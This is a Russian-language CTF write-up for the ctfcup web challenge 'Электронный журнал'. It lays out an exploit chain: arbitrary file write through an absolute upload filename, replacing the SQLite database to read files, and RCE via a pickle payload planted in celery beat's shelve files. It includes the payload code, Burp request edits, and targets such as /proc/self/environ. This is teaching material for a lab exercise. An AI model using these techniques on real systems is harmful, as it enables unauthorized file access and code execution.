# Электронный журнал — райтап (web, 1000 pts)

> CTF: ctfcup · категория: web · солверов на момент решения: 0
> **Флаг:** `ctfcup{v53_ur0k1_5d3l4ny_5_0gyrc0m_d62f73b8ec64160e}`
> Работать только по собственному/выданному CTF-инстансу.

---

## TL;DR — вся цепочка в 5 строк

1. `POST /lesson/2/upload` с `filename="/data/uroki.db"` — **произвольная запись файла** (абсолютное имя проходит фильтр) — подменяем базу приложения.
2. В подменённой базе урок №1 указывает `file_path=/flag.txt` → `GET /lesson/1/file` = **произвольное чтение**.
3. Чтение даёт 500: в `entrypoint.sh` флаг `chown app:app + chmod 0000`. Владелец файла может сам себе `chmod` → нужен **код от имени `app`**.
4. celery beat хранит расписание в shelve-файле = **pickle** в каталоге `/data`, доступном нам на запись. Заливаем dumbdbm-трио с payload в ключе `entries`.
5. `POST /lesson` дёргает `supervisorctl restart celery` → beat распикливает наш payload → `os.chmod('/flag.txt', 0o644)` → читаем флаг.

---

## 1. Разведка

В приложении к таску — исходники: Flask-сайт «электронного журнала» + celery worker
с `filesystem://` брокером. Описание таска: *«Заведите урок, приложите файл - и ждите
звонка»* («звонок» = срабатывание задачи по расписанию — это прямота в сторону celery beat).

Что важно сразу отметить при чтении кода:

| Файл | Что подозрительно |
|---|---|
| `app/storage.py` | фильтр имени файла блокирует только `..`, `\`, control-символы; **абсолютный путь проходит** |
| `app/ops.py` | любое создание/правка урока делает `supervisorctl restart celery` — **управляемый рестарт воркера** |
| `app/tasks.py` | celery с брокером `filesystem://`, данные в `/data/mq` |
| `app/db.py`, `web.py` | база — SQLite в `/data/uroki.db`; отдача вложения — `send_file(lesson["file_path"])`, путь берётся **из БД** |
| `app/legacy.py` | голый `eval()` — приманка: файл никто не импортирует |
| `Dockerfile` | `/app` — `0555 root` (не перезаписать), `/data` — весь принадлежит `app`, флаг в `/flag.txt`, `entrypoint.sh` отсутствует в архиве |
| `supervisord.conf` | celery: `worker -B` (встроенный beat!), `directory=/data` — **schedule-файл будет в /data** |

## 2. Уязвимости

### V1. Произвольная запись файла (главная)

```python
UNSAFE = re.compile(r"\.\.|\\|[\x00-\x1f]")

def clean_name(name):
    name = (name or "").strip()
    if UNSAFE.search(name):
        name = os.path.basename(name.replace("\\", "/"))
    return name.strip() or "attachment"

path = os.path.join(UPLOAD_DIR, clean_name(file.filename))  # /data/uploads
file.save(path)
```

Имя `/data/uroki.db` не содержит `..`, `\` и control-символов → проходит как есть.
`os.path.join("/data/uploads", "/data/uroki.db")` при абсолютном втором аргументе
возвращает **только второй** → пишем куда угодно, куда может писать пользователь `app`
(а это весь `/data`, плюс `/tmp`, `/dev/shm`).

### V2. Подмена БД → произвольное чтение

`download_attachment` отдаёт `send_file(lesson["file_path"])`. Путь живёт в БД,
а БД мы можем **заменить целиком** через V1. Крафтим SQLite с тем же schema,
где урок №1 имеет `file_path=/flag.txt`. Схема — из `db.py`, comments-таблицу
включаем, чтобы приложение не падало.

### V3. Почему чтение флага даёт 500

Реальный `entrypoint.sh` (читается тем же примитивом, в образе он `0555`):

```sh
chown app:app /flag.txt
chmod 0000 /flag.txt
```

Файл принадлежит `app` → владелец всегда может сделать себе `chmod`. Значит
нужен code execution от `app` (чтения/записи файлов уже мало).

### V4. RCE через pickle в celery beat

- celery запущен как `celery -A app.tasks worker -B` с `directory=/data` →
  встроенный beat хранит расписание в **`/data/celerybeat-schedule`**.
- `PersistentScheduler` использует `shelve` → внутри значения — **pickle без подписи**.
- Ключевой порядок загрузки (`celery/beat.py`): `setup_schedule()` открывает shelve и
  обращается к `self._store['entries']` → **наше значение распикливается здесь**.
- `dbm.whichdb()` (Python 3.12) выбирает бэкенд в порядке:
  `(.pag+.dir → ndbm)` → `(.db → ndbm)` → `(.dat+.dir → dumbdbm)` → магия файла.
  Значит пара наших файлов `.dat` + `.dir` **перебивает** существующий gdbm-файл
  (тот лежит без суффикса, его магия проверяется последней).
- Payload оформляем через `eval`, чтобы значение оставалось `{}` — beat после
  выполнения продолжит нормально жить и не уйдёт в crash-loop:

```python
class Payload:
    def __reduce__(self):
        return (eval, ("__import__('os').chmod('/flag.txt', 0o644) or {}",))
```

- Триггер рестарта — создание/правка урока (`ops.apply_schedule_changes()`).

Формат dumbdbm: `.dir` — текстовый индекс (строки `repr(key), (offset, size)`),
`.dat` — сырые байты значений. Наш `.dir`:

```
'entries', (0, 153)
```

а `.dat` — 153 байта pickle. `.bak` — копия `.dat` (dumbdbm его пишет при апдейтах).

## 3. Эксплуатация

### 3.1. Скриптом (быстро)

```bash
pip install requests

# Этап 1: подмена БД + чтение файла (заодно проверка примитива)
python3 uroki_exploit.py http://ИНСТАНС:5000

# Разведка: какие schedule-файлы существуют
python3 uroki_stage2_rce.py probe http://ИНСТАНС:5000

# Этап 2: pickle-RCE -> chmod флага -> чтение
python3 uroki_stage2_rce.py pwn http://ИНСТАНС:5000
```

Скрипты идемпотентны: сами создают недостающие уроки, ретраят запросы
(прокси платформы периодически отдаёт 400 «Token is not provided» — это флак
балансера, а не наша ошибка), восстанавливают evil.db после заливки payload-файлов.

### 3.2. Вручную / через Burp

**Этап 1.**

1. Через веб-морду создай **два** урока (нужны id 1 и 2 в свежем инстансе).
2. Сгенерируй базу: `python3 craft_uroki_db.py /flag.txt evil.db`.
3. Burp: приложи любой файл к уроку **№2** (не №1! — upload делает
   `UPDATE lessons SET file_path=... WHERE id=<этот урок>` и затрёт флаговую строку),
   в перехваченном запросе поменяй:

```http
Content-Disposition: form-data; name="file"; filename="/data/uroki.db"
```

   Бинарное тело — через Repeater → `Paste from file` (evil.db). Ответ: `303`.
4. Проверка: `GET /api/lessons.json` → строки `flag` и `x`.
5. `GET /lesson/1/file` → содержимое файла. Для `/flag.txt` получишь 500 — это V3, иди на этап 2.

**Этап 2.**

1. Сгенерируй payload-файлы: `python3 craft_beat_shelve.py "__import__('os').chmod('/flag.txt', 0o644) or {}" /tmp/pwn`
   → получишь `/tmp/pwn.dir`, `/tmp/pwn.dat`, `/tmp/pwn.bak`.
2. Burp'ом (так же, как выше) залей их как вложения к уроку №2 с именами:
   - `filename="/data/celerybeat-schedule.dir"` ← содержимое `pwn.dir`
   - `filename="/data/celerybeat-schedule.dat"` ← `pwn.dat`
   - `filename="/data/celerybeat-schedule.bak"` ← `pwn.dat` (копия)
   - опционально затри мусором `/data/celerybeat-schedule` и `/data/celerybeat-schedule.db`
     (ломает детект gdbm/ndbm; при живых `.dat+.dir` dumbdbm и так выигрывает).
3. Снова залей evil.db (шаги 1.2–1.3), чтобы строка №1 снова указывала на `/flag.txt`
   (последний upload перезаписал `file_path` строки №2 — на №1 не влияет).
4. Создай новый урок — это триггер `supervisorctl restart celery`.
5. Через ~5–10 секунд `GET /lesson/1/file` → флаг. Не отдал — создай ещё урок
   (повторный триггер) и проверь `/data/worker.err.log` чтением через этап 1.

### 3.3. Диагностика через примитив чтения

В любой момент можно сменить цель чтения (аргумент скрипта / `file_path` в evil.db):
`/proc/self/environ`, `/data/worker.err.log`, `/data/web.err.log`, `/entrypoint.sh`,
`/etc/supervisord.conf`. Лог воркера покажет traceback, если beat не съел payload.

## 4. Локальный стенд (потренироваться без инстанса)

```bash
bash setup_local_lab.sh /путь/к/uroki.zip     # распакует, пропатчит пути, инициализирует БД
echo 'ctfcup{local_test}' > /tmp/uroki_test/data/SECRET_FLAG.txt
python3 uroki_local_run.py                    # http://127.0.0.1:5099

# в другом терминале — полный прогон этапа 1:
python3 uroki_exploit.py http://127.0.0.1:5099 /tmp/uroki_test/data/SECRET_FLAG.txt /tmp/uroki_test/data/uroki.db
```

Этап 2 локально: `cd /tmp/uroki_test/data && PYTHONPATH=/tmp/uroki_test celery -A app.tasks worker -B --concurrency=1`,
залей trio как в 3.2 (пути `/tmp/uroki_test/data/celerybeat-schedule.*`), рестарт — просто перезапусти celery.

## 5. Комплект файлов

| Файл | Назначение |
|---|---|
| `uroki_exploit.py` | Этап 1: подмена БД → чтение произвольного файла (`BASE [file] [db_path]`) |
| `uroki_stage2_rce.py` | Этап 2: probe + полный pwn-цикл (pickle → chmod → флаг) |
| `craft_uroki_db.py` | Генератор evil.db для ручной эксплуатации (`TARGET_FILE OUT`) |
| `craft_beat_shelve.py` | Генератор dumbdbm-трио с payload (`CODE PREFIX`) |
| `setup_local_lab.sh` | Сборка локального стенда из uroki.zip |
| `uroki_local_run.py` | Запуск локального приложения (:5099) |

Зависимости: только `requests` (+ локально Flask/celery для стенда — `pip install Flask==3.0.3 celery==5.3.4`).

## 6. Чеклист на будущие web-таски

1. **Загрузка файлов** — всегда проверять: `os.path.join` с абсолютным именем, `basename` только в одной ветке, фильтр по blacklist вместо whitelist.
2. **Пути из БД в `send_file`/`open`** — кто контролирует значение и можно ли записать в БД напрямую (подмена файла БД, SQLi, масс-ассайн).
3. **Очереди/шедулеры рядом с приложением** — `filesystem://` брокер, shelve, pickle, каталоги очередей, доступные на запись; рестарт воркера, управляемый действием из приложения.
4. **Мелочи в `Dockerfile`/entrypoint** — кто владелец флага и какие права; что из этого следует (chmod себе = нужен код от владельца; root-владелец = нужен privesc).
5. **Dead code (eval, exec, deserialize)** — часто приманка; проверять, импортируется ли вообще.
6. **Примитив чтения файлов — твой дебаггер**: логи, `/proc/*/environ`, entrypoint, конфиги супервизора.
